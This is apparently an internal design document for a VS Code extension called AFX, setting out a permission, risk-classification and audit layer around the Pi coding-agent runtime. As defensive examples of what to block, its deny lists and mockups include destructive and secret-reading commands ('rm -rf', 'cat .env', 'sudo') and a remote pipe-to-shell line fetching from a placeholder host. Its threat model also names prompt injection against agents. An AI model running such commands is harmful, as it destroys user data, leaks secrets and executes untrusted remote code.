---
afx: true
type: RES
status: Living
owner: "@rixrix"
version: "0.6.0"
created_at: "2026-04-27T12:42:01.000Z"
updated_at: "2026-04-28T01:37:40.000Z"
tags: ["research", "pi", "security", "tool-policy", "permissions", "vscode"]
---

# Pi Tool-Call Safety Model

## Context

AFX is integrating Pi as the first agent runtime through RPC. Pi's RPC mode is intentionally thin: it gives AFX a headless agent process over JSONL, but the embedding host must own the IDE experience around that process.

That includes security.

The specific concern:

```text
Pi can propose or perform powerful coding-agent actions.
AFX is the user's IDE surface.
Therefore AFX must define the user-facing permission boundary.
```

This document is research support for the safety decision. The current direction is now clear enough to promote: keep Pi as a plain, high-agency runtime, but place an AFX-controlled permission and auto-approve layer in front of host actions.

Recommended workflow:

```text
Research
  -> ADR: host-side tool-call permission policy
  -> Sprint/spec: permission gate implementation
  -> Code
  -> Security verification
```

## Research Questions

1. Where should the permission boundary live when Pi is embedded through RPC?
2. Which actions should be allowed, confirmed, denied, or audited?
3. Should AFX use chat UI, native VS Code UI, or both for confirmations?
4. What can AFX safely enforce in the current build without re-implementing Pi's entire tool system?
5. What must be documented before implementation starts?

## Sources

- Pi RPC docs: <https://github.com/badlogic/pi-mono/blob/main/packages/coding-agent/docs/rpc.md>
- Pi extensions docs: <https://github.com/badlogic/pi-mono/blob/main/packages/coding-agent/docs/extensions.md>
- Pi packages docs: <https://github.com/badlogic/pi-mono/blob/main/packages/coding-agent/docs/packages.md>
- Pi bash tool source: <https://github.com/badlogic/pi-mono/blob/main/packages/coding-agent/src/core/tools/bash.ts>
- OWASP GenAI Top 10 landing page: <https://genai.owasp.org/llm-top-10/>
- Local Pi RPC research: `res-pi-rpc-features.md`
- Current Pi work plan: `res-pi-technical-challenge.md`
- Main chat-foundation spec: `../../specs/chat-foundation/chat-foundation.md`

## Scope

### In Scope

- Host-side policy for tool calls and risky runtime actions.
- Permission and confirmation UX.
- Workspace and path boundaries.
- Shell command risk classification.
- File read/write policy.
- Extension UI request policy.
- Audit events in chat, history, and debug surfaces.
- Denial, timeout, and abort behavior.
- Pi RPC integration implications.

### Out of Scope

- Enterprise policy sync.
- Cloud-managed allow/deny lists.
- Full malware detection.
- Static analysis of arbitrary scripts.
- OS-level sandboxing.
- Provider authentication and BYO key storage.
- Replacing Pi's full tool execution system in the first pass.

## Key Finding

AFX should not treat Pi RPC as a trusted action executor.

Pi should remain the runtime engine, but AFX should own:

- Risk classification.
- User confirmation.
- Workspace boundary checks.
- Path and secret protection.
- Permission persistence.
- Audit visibility.
- Denial recovery UX.

The working model is:

```text
Pi proposes or initiates an action.
AFX classifies and gates the action.
The user sees what is happening.
AFX records the decision.
Pi receives a clear allow, deny, or abort result.
```

## Chosen Direction - Plain Pi + Controlled Auto-Approve

The product direction is not to domesticate Pi into a narrow wrapper. AFX should keep the "Plain Pi" spirit: Pi remains the engine that plans, streams, calls tools, and moves quickly.

The safety layer should control what the host permits, not replace Pi's runtime.

```text
Plain Pi runtime
  + AFX policy gate
  + controlled auto-approve profiles
  + visible warning when users choose Free Flow
```

This creates three user-facing safety profiles:

| Profile                 | Default         | Behavior                                                                                                          | Intended User                                   |
| ----------------------- | --------------- | ----------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| Guarded                 | Yes             | Blocks critical actions, asks before shell/write/broad file access, remembers only scoped approvals               | Normal users and new workspaces                 |
| Controlled Auto-Approve | Opt-in          | Users enable scoped categories such as read-only, mentioned-file writes, allowlisted commands, or session actions | Daily users who want less friction              |
| Free Flow               | Explicit opt-in | Broad auto-approve profile that lets Pi move with minimal prompts after a strong warning                          | Power users in trusted or disposable workspaces |

Important distinction:

```text
Free Flow is still an AFX profile.
It is not a bypass around AFX observability.
It should auto-approve through the permission service,
emit audit events, and keep the UI visibly marked as high trust.
```

Recommended default:

```text
Start Guarded.
Let users deliberately step up to Controlled Auto-Approve.
Let users deliberately step up again to Free Flow with a large warning.
```

The Free Flow warning should be concrete, not vague:

```text
Free Flow lets Pi run commands, read files, edit files, install packages,
and make project-changing actions with little or no confirmation.

Only use this in a workspace you trust.
This is not a sandbox.
AFX will show audit events, but it cannot guarantee that an approved
command is safe.
```

## Pi Native Safety Posture

Pi does acknowledge the security concern around extensibility and package/skill loading. Its package docs state that packages run with full system access, extensions execute arbitrary code, and skills can instruct the model to perform actions including running executables. Its skills docs carry a similar warning that skill content can instruct arbitrary actions and may include executable code.

Pi also exposes hooks that make a safety layer possible:

- `tool_call` fires after tool preflight and before execution.
- `tool_call` can block by returning `{ block: true, reason }`.
- The `tool_call` event can inspect and mutate inputs for built-in tools such as `bash`, `read`, `write`, and `edit`.
- RPC mode exposes extension UI dialog methods such as `select`, `confirm`, `input`, and `editor`, which a host can use for permission prompts.

However, Pi's built-in bash tool is not a policy engine. The bash source shows direct shell execution through `spawn(shell, [...args, command])`, with support for:

- Custom shell path.
- Command prefix.
- Spawn hook.
- Pluggable operations.
- Timeout.
- Abort signal.
- Process-tree kill.
- Output truncation.
- Full-output temp file.

What is not visible as a built-in default:

- Command allowlist.
- Command denylist.
- Dangerous shell pattern classifier.
- Path-aware shell policy.
- User confirmation before bash execution.
- Session-scoped remembered approvals.
- Audit trail for permission decisions.

Pi's extension docs include an example `tool_call` handler that blocks `rm -rf`, which confirms the intended extension point. But that is an example of how an embedding or extension can build policy; it is not a default shell safety model.

Implication for AFX:

```text
Pi gives us hooks, not a product safety policy.
AFX must own the default permission experience.
```

## Policy Requirements

These requirements should flow into the ADR or implementation sprint. They are written as product requirements, not product-comparison notes.

### REQ-SAFE-001 - Permission Requests Are First-Class Events

AFX should model permission requests explicitly, not as incidental chat messages.

Minimum fields:

- Request ID.
- Runtime.
- Session ID.
- Action kind.
- Tool name.
- Risk level.
- Path patterns or command patterns.
- Human-readable summary.
- Proposed default decision.
- Expiration or timeout state.

### REQ-SAFE-002 - Default Posture Is Ask, Not Auto-Allow

New categories should ask by default. Auto-approval should be opt-in and scoped.

Allowed scopes:

- Once.
- Session.
- Workspace, only after settings UI exists.

Avoid in foundation:

- Global always-allow for all commands.
- Persisted wildcard allow without a policy editor.

### REQ-SAFE-003 - Path Policy Must Fail Closed

If AFX cannot prove a path is inside the workspace and allowed by policy, it should deny or ask as critical.

Rules:

- Resolve symlinks when possible.
- Reject traversal that escapes the workspace.
- Treat unresolved or missing paths carefully.
- Block secret-like files by default.
- Deny outside-workspace writes by default.

### REQ-SAFE-004 - Ignore/Policy Rules Are Enforcement, Not Prompt Text

AFX can show policy rules to the model, but enforcement must happen in host code.

Required:

- Check direct file reads.
- Check file writes.
- Check directory listings.
- Check mention expansion.
- Check shell commands that read files.

### REQ-SAFE-005 - Command Policy Needs Allow and Deny Lists

AFX should support command prefix policy with conflict resolution.

Recommended:

- Deny list.
- Allow list.
- Longest prefix match.
- Any denied sub-command blocks the full command.
- Dangerous shell substitutions are never auto-approved.

### REQ-SAFE-006 - Permission UI Must Recover After Reconnect

Pending permission requests should be recoverable if the webview reloads or reconnects.

Required:

- Host-side pending request store.
- Chat/webview request replay.
- Timeout or cancellation path.
- Error state if the backend cannot be reached.

### REQ-SAFE-007 - Denial Must Be Model-Readable

When the user denies an action, Pi should receive a clear result that allows recovery.

Examples:

```text
Denied by user: command matched critical policy.
Denied by policy: path is outside workspace.
Denied by policy: file appears to contain secrets.
```

### REQ-SAFE-008 - Permission Prompts Are Not Sandboxing

AFX documentation and settings UI should state that permission prompts improve visibility and control, but do not provide OS-level isolation.

## AFX Permission Flow Mockup

```text
Pi event/tool request
  |
  v
Pi adapter extracts action
  |
  v
AgentPermissionRequest
  |
  +-- id: req-123
  +-- kind: shell
  +-- command: pnpm test
  +-- risk: medium
  +-- patterns: ["pnpm test"]
  |
  v
AFX Permission Service
  |
  +-- hard deny?
  +-- session allow?
  +-- command allow/deny?
  +-- workspace/path allowed?
  |
  +--> allow
  +--> deny
  +--> ask
          |
          v
      Chat/native UI
          |
          +--> once
          +--> session
          +--> reject
          +--> abort
```

## Proposed Policy File Shape

This is not required for the first implementation, but it is useful to design toward.

```yaml
version: 1
defaults:
  read: ask
  write: ask
  execute: ask
  mcp: ask
  outside_workspace: deny
  secrets: deny

paths:
  - pattern: ".env*"
    action: deny
  - pattern: "node_modules/**"
    action: deny
  - pattern: "docs/**"
    action: allow_read

commands:
  - pattern: "git status"
    action: allow
  - pattern: "pnpm test"
    action: ask
  - pattern: "git push"
    action: deny
  - pattern: "rm -rf"
    action: deny
```

For foundation, session memory may be enough. Persisted workspace policy can come after there is a settings editor and clear import/export behavior.

## Current Pi-Oriented Flow

This is the likely shape when AFX uses Pi primarily as a black-box runtime:

```text
+------------------+
| User             |
+------------------+
          |
          v
+------------------+
| AFX Chat Webview |
+------------------+
          |
          | chat/send
          v
+-----------------------+
| VS Code Extension Host |
+-----------------------+
          |
          | AgentManager.send()
          v
+------------------+
| Pi RPC Adapter   |
+------------------+
          |
          | {"type":"prompt","message":"..."}
          v
+------------------+
| Pi Process       |
+------------------+
          |
          | decides tools, files, commands
          v
+------------------+
| Pi Tool Action   |
+------------------+
          |
          | events and messages
          v
+-----------------------+
| AFX Chat Rendering    |
+-----------------------+
```

Security weakness:

```text
The user interacts with AFX,
but the risky action may be decided inside Pi.

User intent -> AFX -> Pi -> tool action
                     |
                     +-- AFX may observe the result too late
```

## Target AFX Flow

AFX should introduce a visible permission boundary.

```text
+------------------+
| User             |
+------------------+
          |
          v
+------------------+
| AFX Chat Webview |
+------------------+
          |
          v
+-----------------------+
| VS Code Extension Host |
+-----------------------+
          |
          v
+------------------+
| AgentManager     |
+------------------+
          |
          v
+------------------+
| Pi Adapter       |
+------------------+
          |
          v
+------------------+
| Policy Gate      |
+------------------+
          |
          +--> classify risk
          +--> check workspace boundary
          +--> check path policy
          +--> check command policy
          +--> check remembered decisions
          +--> request confirmation if needed
          |
          +--> allow -> continue action
          +--> deny  -> return denial to runtime
          +--> ask   -> chat/native UI prompt
          +--> abort -> stop active run
          |
          v
+------------------+
| Audit Event      |
+------------------+
          |
          +--> Chat timeline
          +--> History
          +--> Debug panel
```

Design principle:

```text
Pi is allowed to propose actions.
AFX decides whether the host should permit them.
```

## AFX Architecture Placement

```text
packages/shared
  AgentToolRequest
  AgentToolDecision
  AgentPermissionPolicy
  AgentAuditEvent

packages/agent/pi
  Pi event normalization
  Pi action extraction
  Pi response mapping

apps/vscode
  Workspace trust checks
  File/path checks
  Shell classifier
  Permission persistence
  Native VS Code prompt fallback

apps/chat
  Inline permission cards
  Audit timeline rendering
  User-facing status
```

The chat app should stay runtime-agnostic. It should render generic permission requests, not Pi-specific RPC shapes.

Draft shared type:

```ts
type AgentToolRequest = {
  id: string;
  runtime: "pi";
  kind: "shell" | "fileRead" | "fileWrite" | "edit" | "extensionUi" | "network" | "unknown";
  title: string;
  summary: string;
  risk: "low" | "medium" | "high" | "critical";
  paths?: string[];
  command?: string;
  proposedBy: "agent" | "extension" | "user";
};
```

## Threat Model

### Assets

- User source code.
- Workspace files.
- Git history and uncommitted changes.
- Secrets in `.env`, config files, terminals, or shell environment.
- Local machine state.
- Package manager state.
- User trust in AFX.

### Threat Actors

- Benign model making unsafe assumptions.
- Prompt injection from files or command output.
- Malicious dependency scripts.
- Malicious workspace content.
- Misconfigured or overly powerful Pi extension.
- User accidentally approving a dangerous action.

### Threat Scenarios

| Scenario                     | Risk       | Example                              |
| ---------------------------- | ---------- | ------------------------------------ |
| Destructive shell command    | Critical   | Delete project files                 |
| Secret exfiltration          | Critical   | Read `.env` then send to network     |
| Workspace escape             | Critical   | Edit files outside opened workspace  |
| Supply-chain mutation        | High       | Install package or run postinstall   |
| Git mutation                 | High       | Commit, reset, rebase, force push    |
| Prompt-injected tool request | High       | README asks agent to run a command   |
| Silent file modification     | High       | Agent edits unmentioned source files |
| Large context ingestion      | Medium     | Read broad directory tree            |
| Non-destructive inspection   | Low/Medium | Read explicitly mentioned file       |

## Policy Options

### Option A - Pi-Native Trust / Free Flow

AFX lets Pi run with broad approval and mostly displays events. This is the spirit of Plain Pi, but it is too powerful to be the default inside the AFX IDE surface.

Benefits:

- Fastest implementation.
- Least adapter complexity.
- Lowest chance of breaking Pi behavior.
- Best "agent just moves" experience for users who knowingly want it.

Risks:

- No consistent AFX safety posture.
- Audit trail depends on Pi behavior.
- Hard to explain product security to users.
- Hard to extend to future runtimes.
- Dangerous if enabled silently or globally.

Assessment:

Not enough as the default product posture. Keep as an explicit Free Flow profile with a large warning, visible state, and audit events.

### Option B - AFX Confirmation Wrapper

AFX intercepts observable risky actions and asks the user before allowing continuation.

Benefits:

- Good first security layer.
- Preserves Pi as the runtime engine.
- Gives users a visible permission model.
- Enables audit events.
- Can become runtime-neutral later.

Risks:

- Depends on Pi exposing actions early enough.
- Some actions may only be observable after Pi has already started work.
- Needs careful UI to avoid confirmation fatigue.

Assessment:

Best near-term default and the implementation layer behind controlled auto-approve.

### Option C - AFX-Owned Tool Execution

AFX re-implements selected tool execution behind its own services and treats Pi mainly as planner/model loop.

Benefits:

- Strongest control.
- Best auditability.
- Runtime-swappable.

Risks:

- Highest complexity.
- May fight Pi's architecture.
- Slower to ship.
- Requires more test coverage and security review.

Assessment:

Good long-term direction for high-risk actions, not foundation.

## Option Comparison

| Option                         | Control | Complexity | Product Fit                           | Recommendation                          |
| ------------------------------ | ------- | ---------- | ------------------------------------- | --------------------------------------- |
| A. Pi-native trust / Free Flow | Low     | Low        | Good for power users, poor as default | Expose only as explicit warned profile  |
| B. AFX confirmation wrapper    | Medium  | Medium     | Strong                                | Adopt as default and auto-approve layer |
| C. AFX-owned tools             | High    | High       | Later                                 | Explore for selected tools              |

## Recommended Policy

Adopt Option B as the default, while preserving Option A as a deliberate Free Flow mode:

```text
AFX owns a host-side permission gate around Pi tool/action requests.
Pi remains the runtime engine.
AFX classifies risk, prompts users, enforces workspace boundaries,
and records audit events.
```

Default stance:

```text
Guarded by default.
Auto-approve only when the user has opted into a scoped category or profile.
Free Flow only after an explicit warning.
```

Free Flow stance:

```text
Broad auto-approve, visible trust banner, full audit trail.
Not a sandbox. Not enabled silently. Not the first-run default.
```

Escalate specific action classes toward Option C only if Pi RPC does not expose enough control before execution.

## Risk Classification

### Low Risk

Allowed by default only for non-mutating host actions and logged lightly.

- Fetch model or session status.
- Render non-destructive UI.
- Read already-open editor text.
- Read files explicitly mentioned by the user, inside workspace, under size limits, when the active profile allows read auto-approval.

### Medium Risk

Ask once per session or per path group.

- Read unmentioned files inside workspace.
- List directories.
- Read broad file groups.
- Edit files explicitly mentioned by the user.
- Run known read-only commands such as `git status`.

### High Risk

Ask every time unless the user creates a scoped remembered decision.

- Write unmentioned files.
- Run package scripts.
- Install dependencies.
- Make network calls.
- Mutate git state.
- Start or stop long-running processes.

### Critical Risk

Deny by default. Require explicit override through a stronger UI path.

- Delete files or directories.
- Force git operations.
- Read secrets.
- Write outside workspace.
- Execute remote scripts.
- Use `sudo`.
- Change global user config.

## Path Policy

```text
Path request
  |
  +-- Is path inside workspace?
  |     |
  |     +-- no -> deny or critical confirmation
  |
  +-- Does path escape via traversal or symlink?
  |     |
  |     +-- yes -> deny
  |
  +-- Is path secret-like?
  |     |
  |     +-- yes -> critical
  |
  +-- Is file too large?
  |     |
  |     +-- yes -> ask or deny
  |
  +-- Is file binary?
        |
        +-- image -> allow only through image policy
        +-- other -> deny by default
```

Initial defaults:

- Allow explicit user-mentioned workspace reads.
- Ask for unmentioned workspace reads.
- Ask for writes to mentioned files.
- Ask every time for writes to unmentioned files.
- Deny writes outside workspace.
- Deny secret access by default.

## Shell Command Policy

```text
Command request
  |
  v
Classify command
  |
  +-- known read-only -> medium
  +-- package manager install -> high
  +-- project script -> high
  +-- git mutation -> high
  +-- delete/chmod/chown/sudo -> critical
  +-- network pipe to shell -> critical
  +-- unknown -> high
  |
  v
allow / ask / deny / abort
```

Examples:

| Command shape  | Default        | Reason               |
| -------------- | -------------- | -------------------- | ----------------------- |
| `git status`   | Ask once       | Repo inspection      |
| `pnpm test`    | Ask once       | Runs project code    |
| `pnpm install` | Ask every time | Dependency mutation  |
| `git commit`   | Ask every time | Mutates history      |
| `rm -rf ...`   | Deny           | Destructive          |
| `curl ...      | sh`            | Deny                 | Remote script execution |
| `sudo ...`     | Deny           | Privilege escalation |
| `cat .env`     | Deny           | Secret access        |

## Permission UX

### Free Flow Warning

Free Flow should require a stronger confirmation than a normal tool ask. It is a mode change, not a single action approval.

```text
+------------------------------------------------------------+
| Enable Free Flow?                                          |
+------------------------------------------------------------+
| Pi will be allowed to run with broad auto-approval.        |
|                                                            |
| This can run shell commands, edit or delete files, read    |
| project data, install packages, and make changes quickly.  |
|                                                            |
| Use only in a workspace you trust. This is not a sandbox.  |
| AFX will keep showing audit events, but approved actions   |
| can still affect your machine and your source tree.        |
|                                                            |
| [Cancel] [Enable for this session] [Open safer settings]   |
+------------------------------------------------------------+
```

When enabled, chat and status surfaces should show a persistent signal:

```text
+------------------------------------------------------------+
| AFX Chat                                FREE FLOW ENABLED  |
+------------------------------------------------------------+
| Broad Pi auto-approval is active for this session.         |
+------------------------------------------------------------+
```

### Inline Chat Permission Card

```text
+------------------------------------------------------------+
| Permission Required                                        |
+------------------------------------------------------------+
| Pi wants to run a shell command                            |
|                                                            |
|   pnpm test                                                |
|                                                            |
| Risk: Medium                                               |
| Reason: Runs project code in the workspace                 |
| Scope: workspace                                           |
|                                                            |
| [Allow once] [Allow for session] [Deny] [Abort run]        |
+------------------------------------------------------------+
```

### File Write Confirmation

```text
+------------------------------------------------------------+
| Confirm File Edit                                          |
+------------------------------------------------------------+
| Pi wants to modify:                                        |
|                                                            |
|   apps/chat/src/views/chat.tsx                             |
|   apps/chat/src/components/slash-popup.tsx                 |
|                                                            |
| Risk: High                                                 |
| Reason: Writes source files                                |
| Preview: 2 files, 48 changed lines                         |
|                                                            |
| [Review diff] [Allow once] [Deny] [Abort run]              |
+------------------------------------------------------------+
```

### Critical Denial

```text
+------------------------------------------------------------+
| Blocked by AFX Safety Policy                               |
+------------------------------------------------------------+
| Command denied:                                            |
|                                                            |
|   curl https://example.test/install.sh | sh                |
|                                                            |
| Risk: Critical                                             |
| Reason: Remote script execution                            |
|                                                            |
| [Copy details] [Open policy settings] [Abort run]          |
+------------------------------------------------------------+
```

### Native VS Code Fallback

Native prompts are acceptable when the chat webview cannot safely handle the request timing.

```text
AFX wants confirmation

Pi requested permission to read 12 files outside the current prompt.

[Allow once] [Deny] [Abort]
```

Rule:

```text
If the decision happens outside chat,
the audit result still appears inside chat/history afterwards.
```

## AFX Chat Mockup

```text
+------------------------------------------------------------+
| AFX Chat                                      GPT-5.4   ON  |
+------------------------------------------------------------+
| User                                                       |
|   Fix slash filtering and add tests.                       |
|                                                            |
| Assistant                                                  |
|   I need to inspect the popup components and tests.        |
|                                                            |
| +-- Permission Required ---------------------------------+ |
| | Read files                                             | |
| |                                                        | |
| | - apps/chat/src/components/slash-popup.tsx             | |
| | - apps/chat/src/components/mention-popup.tsx           | |
| |                                                        | |
| | Risk: Low                                              | |
| | [Allow once] [Allow session] [Deny]                    | |
| +--------------------------------------------------------+ |
|                                                            |
| Tool timeline                                              |
|   OK  Read slash-popup.tsx                                 |
|   OK  Read mention-popup.tsx                               |
|   ASK Write chat.tsx requires confirmation                 |
+------------------------------------------------------------+
| / Type a message...                         [Compact] [Run] |
+------------------------------------------------------------+
```

## Pi Baseline Mockup

This is not a criticism of Pi. It is the expected responsibility split when using Pi as a headless runtime.

```text
+------------------------------------------------------------+
| Pi RPC Runtime                                             |
+------------------------------------------------------------+
| Receives prompt                                            |
| Expands skill/template commands                            |
| Streams assistant output                                   |
| Emits tool events                                          |
| Emits extension_ui_request events                          |
| Executes configured tools                                  |
| Returns messages/events over JSONL                         |
+------------------------------------------------------------+

+------------------------------------------------------------+
| Embedding Host / AFX                                       |
+------------------------------------------------------------+
| Process lifecycle                                          |
| JSONL framing                                              |
| Event rendering                                            |
| Extension UI rendering                                     |
| User permissions                                           |
| Workspace boundaries                                       |
| Audit trail                                                |
| Recovery and denial UX                                     |
+------------------------------------------------------------+
```

## Audit Event Model

Every permission decision should produce a structured event.

```ts
type AgentAuditEvent = {
  id: string;
  timestamp: string;
  runId?: string;
  sessionId?: string;
  runtime: "pi";
  requestId: string;
  actionKind: AgentToolRequest["kind"];
  risk: AgentToolRequest["risk"];
  decision: "allowed" | "denied" | "aborted" | "expired";
  decisionScope: "once" | "session" | "workspace" | "always";
  reason: string;
  paths?: string[];
  command?: string;
};
```

Minimum display:

- Inline chat event.
- Debug panel event.
- History/session event.

Later:

- Exportable security log.
- Workspace policy file.
- Team-level policy sync.

## Implementation Phases

### Phase 1 - Decision and Types

- Create ADR-0006 for Plain Pi with AFX-controlled auto-approve.
- Add shared request, decision, and audit types.
- Define default risk matrix.
- Define allow, deny, abort, timeout, and profile semantics.

### Phase 2 - Host Policy Service

- Add VS Code host policy service.
- Add path classifier.
- Add command classifier.
- Add session-scoped remembered decisions.
- Add timeout handling.

### Phase 3 - UI

- Add chat permission card.
- Add native VS Code fallback prompts.
- Add audit rendering in chat/history/debug panel.
- Add settings for confirmation defaults.
- Add Free Flow warning and persistent visible state.

### Phase 4 - Pi Integration

- Map Pi tool/action events into permission requests.
- Map denial back to Pi in a model-readable way.
- Ensure aborted actions stop the active run.
- Verify extension UI request behavior.
- Verify direct Pi RPC paths cannot bypass the AFX policy service.

### Phase 5 - Verification

- Unit test path policy.
- Unit test command policy.
- Component test permission cards.
- Integration test allow, deny, abort, timeout.
- Manual F5 with real Pi runtime.

## Open Questions

1. Does Pi expose every risky action early enough for AFX to block before execution?
2. Which critical actions, if any, remain non-overridable even in Free Flow?
3. Should AFX start with chat permission cards, native VS Code prompts, or a hybrid?
4. Should remembered decisions persist only for the active session?
5. Should writes always require diff preview before approval?
6. How should denied actions be communicated back to Pi?
7. Should AFX support planning-only mode where writes and shell commands are denied?
8. Should this policy integrate with future AFX spec modes?

## Recommendation

Promote this into a Proposed ADR.

ADR title:

```text
Plain Pi with AFX-controlled auto-approve safety layer
```

Decision statement:

```text
AFX will keep Pi as the plain agent runtime while adding an AFX-owned
permission and auto-approve layer for host actions. Guarded mode is the
default. Controlled auto-approve and Free Flow are explicit opt-in profiles,
with Free Flow requiring a large warning and persistent visible state.
```

The ADR should explicitly choose:

- Permission surface: chat, native, or hybrid.
- Decision persistence: once, session, workspace, or always.
- Initial default risk matrix.
- Minimum blocked-action response back to Pi.
- Which actions are denied by default.
- How Free Flow is enabled, displayed, audited, and disabled.

## Next Command

```text
/afx-adr review 0006
```
